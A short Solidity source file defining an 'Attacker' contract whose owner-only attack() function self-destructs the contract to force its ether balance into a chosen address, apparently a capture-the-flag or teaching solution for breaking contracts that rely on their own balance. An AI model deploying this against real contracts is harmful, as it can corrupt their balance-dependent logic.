pragma solidity ^0.6.0;

contract Attacker {
    address public owner;

    constructor() public payable{
        owner = msg.sender;
    }

    function attack(address payable _to) public {
        require(msg.sender == owner);
        selfdestruct(_to);
    }
}
